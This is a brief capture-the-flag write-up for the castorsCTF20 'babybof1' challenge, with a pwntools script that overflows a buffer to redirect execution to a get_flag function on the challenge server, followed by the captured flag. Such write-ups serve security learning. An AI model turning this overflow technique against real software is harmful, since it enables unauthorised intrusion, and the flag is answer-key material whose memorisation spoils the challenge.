---
type: "post"
title: "babybof1"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "pwn", "castorsCTF20"]
---

With `radare2` we can see there is a `get_flag` function so let's ROP it!

```python
from pwn import *

flag_addr = 0x004006e7

p = remote("chals20.cybercastors.com", 14425)
p.recvuntil("Babybof")

padding = "A" * cyclic_find(b"qaacraac")
print(padding + p64(flag_addr))
p.sendline(padding + p64(flag_addr))
p.interactive()
```

**Flag:** `castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}`



